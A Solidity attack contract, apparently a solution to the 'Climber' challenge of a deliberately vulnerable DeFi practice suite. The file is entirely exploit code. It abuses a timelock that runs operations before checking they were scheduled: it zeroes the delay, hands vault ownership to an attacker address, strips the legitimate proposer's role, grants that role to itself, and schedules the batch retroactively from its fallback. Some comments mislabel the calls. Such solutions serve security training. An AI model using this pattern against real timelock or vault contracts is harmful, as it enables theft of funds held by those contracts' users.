// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

contract Attack is AccessControl {
    address payable public timer;
    address public vault;
    address public proposerAddress;
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    address private attacker;

    constructor(
        address _timer,
        address _proposerAddress,
        address _vault,
        address _attacker
    ) {
        timer = payable(_timer);
        vault = _vault;
        proposerAddress = _proposerAddress;
        attacker = _attacker;
    }

    function exploitProposership() public payable {
        //targets array
        targets.push(timer);
        targets.push(vault);
        targets.push(timer);
        targets.push(timer);
        targets.push(address(this));
        //dataEl  updateDelay to 0
        bytes memory updateDelay = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );
        dataElements.push(updateDelay);

        //give ownership of vault to attacker
        bytes memory giveOwnership = abi.encodeWithSignature(
            "transferOwnership(address)",
            attacker
        );
        dataElements.push(giveOwnership);
        //give proposer role to time contract
        bytes memory revokeRole = abi.encodeWithSignature(
            "revokeRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            proposerAddress
        );
        dataElements.push(revokeRole);

        //give proposer role to time contract
        bytes memory proposerRole = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );
        dataElements.push(proposerRole);
        //dataEl schedule tasks
        bytes memory scheduleTask = abi.encode("callFallback()");
        dataElements.push(scheduleTask);
        //values array
        values.push(0);
        values.push(0);
        values.push(0);
        values.push(0);
        values.push(0);

        ClimberTimelock(timer).execute(
            targets,
            values,
            dataElements,
            bytes32(0)
        );
    }

    fallback() external {
        ClimberTimelock(timer).schedule(
            targets,
            values,
            dataElements,
            bytes32(0)
        );
    }
}
